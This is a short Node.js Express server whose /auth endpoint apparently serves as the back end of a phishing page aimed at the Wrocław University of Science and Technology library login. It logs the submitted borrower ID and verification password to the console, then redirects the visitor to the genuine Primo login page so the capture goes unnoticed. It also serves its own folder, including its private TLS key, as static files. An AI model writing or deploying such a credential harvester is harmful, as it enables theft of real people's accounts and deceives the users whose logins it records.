const path = require('path')
const fs = require('fs')
const express = require('express')
const https = require('https')
const http = require('http')
const bodyParser = require('body-parser');

const certOptions = {
  key: fs.readFileSync(path.resolve('./privkeyA.pem')),
  cert: fs.readFileSync(path.resolve('./certA.crt'))
}

const app = express(certOptions)
app.use(express.static(__dirname));
app.use(bodyParser.json({ type: 'application/json' }));
app.use(bodyParser.urlencoded({extended: true}));

app.post('/auth', function(req, res) {
    console.log(req.body)
    console.log(req.body['bor_id'], req.body['bor_verification']);
    
    return res.redirect("https://primo.bg.pwr.edu.pl/pds?func=load-login&url=https://primo.bg.pwr.edu.pl/pds")
  });


https.createServer(certOptions, app).listen(443, () => console.log('working on port 443'));
http.createServer(app).listen(80, () => console.log('working on port 80'));
